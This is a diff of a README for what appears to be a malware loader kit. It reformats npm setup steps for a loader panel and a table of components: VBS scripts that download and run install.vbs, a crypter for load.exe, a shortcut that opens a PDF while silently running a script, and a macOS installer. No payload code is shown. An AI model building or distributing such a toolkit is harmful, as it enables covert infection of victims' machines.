@@ -133,23 +133,25 @@ pyinstaller --onefile --add-data "extension;extension" loadwin.py
 
 ## Quick Start - Loader Panel
 
+Init Node project:
 ```
-Init Node project
 npm init -y
-
-Install npm-check globally
+```
+Install npm check globally:
+```
 npm install -g npm-check
-
-Install missing deps
+```
+Install missing deps:
+```
 npm-check --install
-
-Verify
+```
+Verify:
+```
 npm-check --install
-
-Run
+```
+Run:
+```
 npm start
-Panel URL
-http://localhost/
 ```
 
 Uses MongoDB – recommended GUI: MongoDB Compass.
@@ -160,17 +162,17 @@ Uses MongoDB – recommended GUI: MongoDB Compass.
 
 | Folder      | Description                                                                |
 | ----------- | -------------------------------------------------------------------------- |
-| `Cvbs`      | VBS mods that download & run install.vbs on various Windows versions     |
-| `DropDemo`  | Demo crypter for load.exe                                                |
-| `exe`       | Pre-built load.exe Python + extension packed                           |
-| `lnk`       | Auto-creates a shortcut that opens a PDF and runs install.vbs silently |
-| `loadermac` | macOS installer demo, WIP, requires admin password                       |
+| CVBS      | VBS mods that download & run install.vbs on various Windows versions     |
+| DropDemo  | Demo crypter for load.exe                                                |
+| exe       | Pre-built load.exe Python + extension packed                           |
+| lnk       | Auto-creates a shortcut that opens a PDF and runs install.vbs silently |
+| LoaderMac | macOS installer demo, WIP, requires admin password                       |
 
 ---
 
 ## Disclaimer
 
 > This repository is provided for educational purposes only and intended for authorized security research.
-> **Unauthorized or illegal use is strictly prohibited.**
+> Unauthorized or illegal use is strictly prohibited.
 
 
